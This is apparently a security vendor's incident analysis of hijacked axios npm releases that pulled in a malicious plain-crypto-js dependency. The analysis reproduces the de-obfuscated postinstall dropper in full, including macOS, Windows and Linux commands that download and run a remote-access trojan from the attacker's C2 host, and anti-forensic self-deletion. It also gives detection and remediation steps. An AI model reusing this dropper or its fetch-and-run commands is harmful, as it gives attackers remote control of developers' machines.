---
author: stepsecurity.io
cover_image: >-
  https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cb930b2cc878f01f6f3e63_image%20(90).png
date: '2026-03-31T16:06:41.416Z'
dateFolder: 2026/03/31
description: >-
  Hijacked maintainer account used to publish poisoned axios releases including
  1.14.1 and 0.30.4. The attacker injected a hidden dependency that drops a
  cross platform RAT. We are actively investigating and will update this post
  with a full technical analysis.
isBasedOn: >-
  https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan
link: >-
  https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan
slug: >-
  2026-03-31-httpswwwstepsecurityioblogaxios-compromised-on-npm-malicious-versions-drop-remote-access-trojan
tags:
  - infosec
title: axios Compromised on npm - Malicious Versions Drop Remote Access Trojan
---
<p><a data-btn="wrap" data-parent="" data-wf--button-text--variant="base-flipped" href="https://www.stepsecurity.io/blog"><figure></figure><figure></figure></a></p>
<p><a href="https://www.linkedin.com/in/ashish-kurmi-3428aa24"><figure></figure></a></p>
<p><a href="https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan/#"><figure></figure></a><a href="https://twitter.com/share?url=https%3A%2F%2Fwww.stepsecurity.io%2Fblog%2Faxios-compromised-on-npm-malicious-versions-drop-remote-access-trojan&amp;title=axios+Compromised+on+npm+-+Malicious+Versions+Drop+Remote+Access+Trojan+-+StepSecurity&amp;summary="><figure></figure></a><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fwww.stepsecurity.io%2Fblog%2Faxios-compromised-on-npm-malicious-versions-drop-remote-access-trojan&amp;title=axios+Compromised+on+npm+-+Malicious+Versions+Drop+Remote+Access+Trojan+-+StepSecurity&amp;summary="><figure></figure></a><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.stepsecurity.io%2Fblog%2Faxios-compromised-on-npm-malicious-versions-drop-remote-access-trojan&amp;title=axios+Compromised+on+npm+-+Malicious+Versions+Drop+Remote+Access+Trojan+-+StepSecurity"><figure></figure></a><a href="https://www.stepsecurity.io/blog/rss.xml"><figure></figure></a></p>
<figure><img alt="" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cb932df93c8a05faa93b9a_image%20(91).png"/></figure>
<figure><img alt="" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cb927a9458d00c48b0232f_Screenshot%202026-03-31%20at%201.58.38%E2%80%AFAM.png"/></figure>
<table> <tr> <th>Timestamp (UTC)</th> <th>Event</th> </tr> <tbody> <tr> <td>2026-03-30 05:57</td> <td><code>plain-crypto-js@4.2.0</code> published by <code>nrwise@proton.me</code> — a clean decoy containing a full copy of the legitimate <code>crypto-js</code> source, no <code>postinstall</code> hook. Its sole purpose is to establish npm publishing history so the package does not appear as a zero-history account during later inspection.</td> </tr> <tr> <td>2026-03-31 00:21</td> <td><code>axios@1.14.1</code> published by compromised <code>jasonsaayman</code> account (email: <code>ifstap@proton.me</code>) — injects <code>plain-crypto-js@4.2.1</code> as a runtime dependency, targeting the modern 1.x user base.</td> </tr> <tr> <td>2026-03-31 01:00</td> <td><code>axios@0.30.4</code> published by the same compromised account — identical injection into the legacy 0.x branch, published 39 minutes later to maximize coverage across both release lines.</td> </tr> <tr> <td>2026-03-31 ~03:15</td> <td>npm unpublishes <code>axios@1.14.1</code> and <code>axios@0.30.4</code>. Both versions are removed from the registry and the <code>latest</code> dist-tag reverts to <code>1.14.0</code>. <code>axios@1.14.1</code> had been live for approximately 2 hours 53 minutes; <code>axios@0.30.4</code> for approximately 2 hours 15 minutes. Timestamp is inferred from the axios registry document's <code>modified</code> field (03:15:30Z) — npm does not expose a dedicated per-version unpublish timestamp in its public API.</td> </tr> <tr> <td>2026-03-31 03:25</td> <td>npm initiates a security hold on <code>plain-crypto-js</code>, beginning the process of replacing the malicious package with an npm security-holder stub.</td> </tr> <tr> <td>2026-03-31 04:26</td> <td>npm publishes the security-holder stub <code>plain-crypto-js@0.0.1-security.0</code> under the <code>npm@npmjs.com</code> account, formally replacing the malicious package on the registry. <code>plain-crypto-js@4.2.1</code> had been live for approximately 4 hours 27 minutes. Attempting to install any version of <code>plain-crypto-js</code> now returns the security notice.</td> </tr> </tbody> </table>
<pre><code>// axios@1.14.0 — LEGITIMATE
"_npmUser": {
  "name": "GitHub Actions",
  "email": "npm-oidc-no-reply@github.com",
  "trustedPublisher": {
    "id": "github",
    "oidcConfigId": "oidc:9061ef30-3132-49f4-b28c-9338d192a1a9"
  }
}

// axios@1.14.1 — MALICIOUS
"_npmUser": {
  "name": "jasonsaayman",
  "email": "ifstap@proton.me"
  // no trustedPublisher, no gitHead, no corresponding GitHub commit or tag
}</code></pre>
<table> <tr> <th>File</th> <th>In 4.2.0</th> <th>In 4.2.1</th> <th>Change</th> </tr> <tbody> <tr> <td><code>package.json</code></td> <td>no <code>scripts</code> section</td> <td><code>"postinstall": "node setup.js"</code> added</td> <td>Modified: weapon added</td> </tr> <tr> <td><code>setup.js</code></td> <td>Not present</td> <td>4.2 KB obfuscated dropper</td> <td><strong>Added: the RAT dropper</strong></td> </tr> <tr> <td><code>package.md</code></td> <td>Not present</td> <td>Clean JSON stub reporting version <code>4.2.0</code></td> <td><strong>Added: the anti-forensics cover</strong></td> </tr> </tbody> </table>
<pre><code>// Contents of package.md (the clean replacement stub)
{
  "name": "plain-crypto-js",
  "version": "4.2.0",    // ← reports 4.2.0, not 4.2.1 — deliberate mismatch
  "description": "JavaScript library of crypto standards.",
  "license": "MIT",
  "author": { "name": "Evan Vosberg", "url": "http://github.com/evanvosberg" },
  "homepage": "http://github.com/brix/crypto-js",
  "repository": { "type": "git", "url": "http://github.com/brix/crypto-js.git" },
  "main": "index.js",
  // No "scripts" key — no postinstall, no test
  "dependencies": {}
}</code></pre>
<pre><code># What npm list reports POST-infection (after the package.json swap):
$ npm list plain-crypto-js
myproject@1.0.0
└── plain-crypto-js@4.2.0   # ← reports 4.2.0, not 4.2.1
                               # but the dropper already ran as 4.2.1

# The reliable check is the DIRECTORY PRESENCE, not the version number:
$ ls node_modules/plain-crypto-js
aes.js  cipher-core.js  core.js  ...
# If this directory exists at all, the dropper ran.
# plain-crypto-js is not a dependency of ANY legitimate axios version.</code></pre>
<pre><code>// crypto-js@4.2.0  (LEGITIMATE — Evan Vosberg / brix)
{
  "name": "crypto-js",
  "version": "4.2.0",
  "description": "JavaScript library of crypto standards.",
  "author": "Evan Vosberg",
  "homepage": "http://github.com/brix/crypto-js",
  "scripts": {
    "test": "grunt"             // ← no postinstall
  }
}

// plain-crypto-js@4.2.1  (MALICIOUS — nrwise@proton.me)
{
  "name": "plain-crypto-js",   // ← different name, everything else cloned
  "version": "4.2.1",          // ← version one ahead of the real package
  "description": "JavaScript library of crypto standards.",
  "author": { "name": "Evan Vosberg" },   // ← fraudulent use of real author name
  "homepage": "http://github.com/brix/crypto-js",  // ← real repo, wrong package
  "scripts": {
    "test": "grunt",
    "postinstall": "node setup.js"   // ← THE ONLY DIFFERENCE. The entire weapon.
  }
}</code></pre>
<pre><code># File diff: axios@1.14.0 vs axios@1.14.1 (86 files, source maps excluded)
DIFFERS: package.json
Total differing files: 1

Files only in 1.14.1: (none)
Files only in 1.14.0: (none)</code></pre>
<pre><code># --- axios/package.json (1.14.0)
# +++ axios/package.json (1.14.1)
- "version": "1.14.0",
+ "version": "1.14.1",
  "scripts": {
    "fix": "eslint --fix lib/**/*.js",
-   "prepare": "husky"
  },
  "dependencies": {
    "follow-redirects": "^2.1.0",
    "form-data": "^4.0.1",
    "proxy-from-env": "^2.1.0",
+   "plain-crypto-js": "^4.2.1"
  }</code></pre>
<pre><code># --- axios/package.json (0.30.3)
# +++ axios/package.json (0.30.4)
- "version": "0.30.3",
+ "version": "0.30.4",
  "dependencies": {
    "follow-redirects": "^1.15.4",
    "form-data": "^4.0.4",
    "proxy-from-env": "^1.1.0",
+   "plain-crypto-js": "^4.2.1"
  }</code></pre>
<pre><code>charCode XOR key[(7 × r × r) % 10] XOR 333</code></pre>
<pre><code>stq[0]  → "child_process"          // shell execution
stq[1]  → "os"                      // platform detection
stq[2]  → "fs"                      // filesystem operations
stq[3]  → "http://sfrclak.com:8000/"   // C2 base URL
stq[5]  → "win32"                   // Windows platform identifier
stq[6]  → "darwin"                  // macOS platform identifier
stq[12] → "curl -o /tmp/ld.py -d packages.npm.org/product2 -s SCR_LINK &amp;&amp; nohup python3 /tmp/ld.py SCR_LINK &gt; /dev/null 2&gt;&amp;1 &amp;"
stq[13] → "package.json"            // deleted after execution
stq[14] → "package.md"              // clean stub renamed to package.json
stq[15] → ".exe"
stq[16] → ".ps1"
stq[17] → ".vbs"</code></pre>
<figure><img alt="" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cba62d7e1664416a0e1dfb_mermaid-diagram-2026-03-31-034649.png"/></figure>
<pre><code>// setup.js — de-obfuscated and annotated
// SHA-256: e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09

const _entry = function(campaignId) {
  try {
    // Load Node.js built-in modules via decoded string table
    const fs      = require("fs");           // stq[2]
    const os      = require("os");           // stq[1]
    const { execSync } = require("child_process"); // stq[0]

    // Build the full C2 URL: base + campaign ID
    // stq[3] = "http://sfrclak.com:8000/"
    const c2Url   = "http://sfrclak.com:8000/" + campaignId;
    // → "http://sfrclak.com:8000/6202033"

    // Detect the operating system
    const platform = os.platform();  // "darwin", "win32", or other
    const tmpDir   = os.tmpdir();     // "/tmp" on Linux/macOS, "%TEMP%" on Windows

    // os.type(), os.release(), os.arch() are called but results discarded —
    // likely sends them via the POST body or they are used in the stage-2
    os.type(); os.release(); os.arch();

    let execCommand = "";

    // ─────────────────────────────────────────────────
    // BRANCH 1: macOS (darwin)
    // ─────────────────────────────────────────────────
    if (platform === "darwin") {
      const scriptPath = tmpDir + "/" + campaignId;   // /tmp/6202033

      const appleScript = `
    set {a, s, d} to {"", "${c2Url}", "/Library/Caches/com.apple.act.mond"}
        try
            do shell script "curl -o " &amp; d &amp; a &amp; " -d packages.npm.org/product0" &amp; " -s " &amp; s &amp; " &amp;&amp; chmod 770 " &amp; d &amp; " &amp;&amp; /bin/zsh -c \\"" &amp; d &amp; " " &amp; s &amp; " &amp;\\" &amp;&gt; /dev/null"
        end try
    do shell script "rm -rf ${scriptPath}"`;

      fs.writeFileSync(scriptPath, appleScript);
      execCommand = `nohup osascript "${scriptPath}" &gt; /dev/null 2&gt;&amp;1 &amp;`;

    // ─────────────────────────────────────────────────
    // BRANCH 2: Windows (win32)
    // ─────────────────────────────────────────────────
    } else if (platform === "win32") {

      const psPath = execSync("where powershell").toString().trim();

      const wtPath = process.env.PROGRAMDATA + "\\wt.exe";
      if (!fs.existsSync(wtPath)) {
        fs.copyFileSync(psPath, wtPath);
        // Creates a persistent copy of PowerShell. wt.exe is Windows Terminal's
        // binary name — a legitimate-looking process in %PROGRAMDATA%.
      }

      const ps1Path = tmpDir + "\\" + campaignId + ".ps1";  // %TEMP%\6202033.ps1
      const vbsPath = tmpDir + "\\" + campaignId + ".vbs";  // %TEMP%\6202033.vbs

      const vbScript = `
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "cmd.exe /c curl -s -X POST -d ""packages.npm.org/product1"" ""${c2Url}"" &gt; ""${ps1Path}"" &amp; ""${wtPath}"" -w hidden -ep bypass -file ""${ps1Path}"" ""${c2Url}"" &amp; del ""${ps1Path}"" /f", 0, False`;

      fs.writeFileSync(vbsPath, vbScript);
      execCommand = `cscript "${vbsPath}" //nologo &amp;&amp; del "${vbsPath}" /f`;

    // ─────────────────────────────────────────────────
    // BRANCH 3: Linux / other
    // ─────────────────────────────────────────────────
    } else {
      execCommand = `curl -o /tmp/ld.py -d packages.npm.org/product2 -s ${c2Url} &amp;&amp; nohup python3 /tmp/ld.py ${c2Url} &gt; /dev/null 2&gt;&amp;1 &amp;`;
      // curl and nohup chained with &amp;&amp;: nohup only runs if curl succeeded.
      // If the C2 is unreachable, chain silently fails — npm install still exits 0.
    }

    // execSync is blocking, but all three commands return immediately because
    // the real work is detached to background processes (nohup / cscript 0,False)
    execSync(execCommand);

    // ─────────────────────────────────────────────────
    // ANTI-FORENSICS: cover tracks
    // ─────────────────────────────────────────────────
    const selfPath = __filename;

    fs.unlink(selfPath, () =&gt; {});         // 1. Delete setup.js itself
    fs.unlink("package.json", () =&gt; {});   // 2. Delete malicious package.json
    fs.rename("package.md", "package.json", () =&gt; {}); // 3. Install clean v4.2.0 stub

  } catch(e) {
    // Silent catch — any error (C2 unreachable, permission denied, etc.)
    // is swallowed completely. npm install always exits with code 0.
    // The developer never sees any indication that anything went wrong.
  }
};

// Entry point — "6202033" is the campaign/tracking ID
_entry("6202033");</code></pre>
<pre><code>curl -o /tmp/ld.py \
  -d packages.npm.org/product2 \
  -s http://sfrclak.com:8000/6202033 \
&amp;&amp; nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033 &gt; /dev/null 2&gt;&amp;1 &amp;</code></pre>
<pre><code>-- Written to: /tmp/6202033
-- Executed via: nohup osascript "/tmp/6202033" &gt; /dev/null 2&gt;&amp;1 &amp;
-- This file is deleted by the script itself in the final do shell script line

set {a, s, d} to {"", "http://sfrclak.com:8000/6202033", "/Library/Caches/com.apple.act.mond"}
    try
        do shell script "curl -o " &amp; d &amp; a &amp; " -d packages.npm.org/product0" &amp; " -s " &amp; s &amp; " &amp;&amp; chmod 770 " &amp; d &amp; " &amp;&amp; /bin/zsh -c \"" &amp; d &amp; " " &amp; s &amp; " &amp;\" &amp;&gt; /dev/null"
    end try
do shell script "rm -rf /tmp/6202033"</code></pre>
<pre><code>curl -o /Library/Caches/com.apple.act.mond \
     -d packages.npm.org/product0 \
     -s http://sfrclak.com:8000/6202033 \
  &amp;&amp; chmod 770 /Library/Caches/com.apple.act.mond \
  &amp;&amp; /bin/zsh -c "/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &amp;" \
  &gt;&amp; /dev/null</code></pre>
<pre><code>' Written to: %TEMP%\6202033.vbs
' Executed via: cscript "%TEMP%\6202033.vbs" //nologo &amp;&amp; del "%TEMP%\6202033.vbs" /f
' objShell.Run arg 2=0 (hidden window), arg 3=False (don't wait for completion)

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c curl -s -X POST -d ""packages.npm.org/product1"" ""http://sfrclak.com:8000/6202033"" &gt; ""%TEMP%\6202033.ps1"" &amp; ""powershell.exe"" -w hidden -ep bypass -file ""%TEMP%\6202033.ps1"" ""http://sfrclak.com:8000/6202033"" &amp; del ""%TEMP%\6202033.ps1"" /f", 0, False</code></pre>
<pre><code># Executed directly via execSync() in Node.js — no intermediate file
curl -o /tmp/ld.py \
     -d packages.npm.org/product2 \
     -s http://sfrclak.com:8000/6202033 \
  &amp;&amp; nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033 &gt; /dev/null 2&gt;&amp;1 &amp;</code></pre>
<figure><img alt="" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cba78b1ebcdd7e289fae20_mermaid-diagram-2026-03-31-035247.png"/></figure>
<figure><img alt="" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cba80cf06c9c7e53157f0d_mermaid-diagram-2026-03-31-035447.png"/></figure>
<figure><img alt="" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cb907e312346bed35b2216_Screenshot%202026-03-31%20at%201.58.22%E2%80%AFAM.png"/></figure>
<pre><code>PID 2366  bash /home/runner/work/_temp/***.sh                         [01:30:48.186Z]
  └─ PID 2380  env node npm install axios@1.14.1                      [01:30:49.603Z]
       └─ PID 2391  sh -c "node setup.js"                             [01:30:50.954Z]
            │  cwd: node_modules/plain-crypto-js  ← postinstall hook fires
            └─ PID 2392  node setup.js                                [01:30:50.955Z]
                 │  cwd: node_modules/plain-crypto-js
                 └─ PID 2399  /bin/sh -c "curl -o /tmp/ld.py \        [01:30:50.978Z]
                          -d packages.npm.org/product2 \
                          -s http://sfrclak.com:8000/6202033 \
                       &amp;&amp; nohup python3 /tmp/ld.py \
                          http://sfrclak.com:8000/6202033 \
                          &gt; /dev/null 2&gt;&amp;1 &amp;"

PID 2401  curl -o /tmp/ld.py -d packages.npm.org/product2            [01:30:50.979Z]
          ppid: 2400  ← child of nohup

PID 2400  nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033   [01:31:27.732Z]
          ppid: 1  ← ORPHANED TO INIT — detached from npm process tree</code></pre>
<pre><code>File: node_modules/plain-crypto-js/package.json

  Write 1 — pid=2380 (npm install)     ts=01:30:50.905Z
             Malicious package.json written to disk during install.
             Contains: { "postinstall": "node setup.js" }

  Write 2 — pid=2392 (node setup.js)   ts=01:31:27.736Z  [+36s]
             Dropper overwrites package.json with clean stub from package.md.
             Contains: version 4.2.0 manifest, no scripts, no postinstall.</code></pre>
<figure><img alt="" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cb909c566fe453e979219b_Screenshot%202026-03-31%20at%201.59.58%E2%80%AFAM.png"/></figure>
<pre><code>npm list axios 2&gt;/dev/null | grep -E "1\.14\.1|0\.30\.4"
grep -A1 '"axios"' package-lock.json | grep -E "1\.14\.1|0\.30\.4"</code></pre>
<pre><code>ls node_modules/plain-crypto-js 2&gt;/dev/null &amp;&amp; echo "POTENTIALLY AFFECTED"</code></pre>
<pre><code># macOS
ls -la /Library/Caches/com.apple.act.mond 2&gt;/dev/null &amp;&amp; echo "COMPROMISED"

# Linux
ls -la /tmp/ld.py 2&gt;/dev/null &amp;&amp; echo "COMPROMISED"

 "COMPROMISED"

# Windows (cmd.exe)
dir "%PROGRAMDATA%\wt.exe" 2&gt;nul &amp;&amp; echo COMPROMISED</code></pre>
<pre><code>npm install axios@1.14.0   # for 1.x users
npm install axios@0.30.3   # for 0.x users </code></pre>
<pre><code>{
 "dependencies": { "axios": "1.14.0" },
 "overrides":    { "axios": "1.14.0" },
 "resolutions":  { "axios": "1.14.0" }
}  </code></pre>
<pre><code>rm -rf node_modules/plain-crypto-js
npm install --ignore-scripts  </code></pre>
<pre><code>npm ci --ignore-scripts  </code></pre>
<pre><code> # Block via firewall (Linux)
iptables -A OUTPUT -d 142.11.206.73-j DROP

# Block via /etc/hosts (macOS/Linux)
echo "0.0.0.0 sfrclak.com" &gt;&gt; /etc/hosts  </code></pre>
<figure><img alt="" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cb90ef6eaf1fd65c8c477f_Screenshot%202026-03-31%20at%202.10.47%E2%80%AFAM.png"/></figure>
<figure><img alt="" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cb91069ed2e93e01cb34e8_Screenshot%202026-03-31%20at%202.06.47%E2%80%AFAM.png"/></figure>
<figure><img alt="" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cb9114cdb8f25035f1d512_Screenshot%202026-03-31%20at%202.06.35%E2%80%AFAM.png"/></figure>
<figure><img alt="" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cb912c6fb17dd3130c8d8c_Screenshot%202026-03-31%20at%202.09.15%E2%80%AFAM.png"/></figure>
<figure><img alt="" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cb913add95ccb21d1fa2c8_Screenshot%202026-03-31%20at%202.11.23%E2%80%AFAM.png"/></figure>
<figure><img alt="" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cb930b2cc878f01f6f3e63_image%20(90).png"/></figure>
<figure><img alt="" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cbbb31ac88034101459c93_Cover-2-31.jpg"/></figure>
<figure><img alt="" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69ca4cd7e11740a6f0ac623f_Cover-1-29.jpg"/></figure>
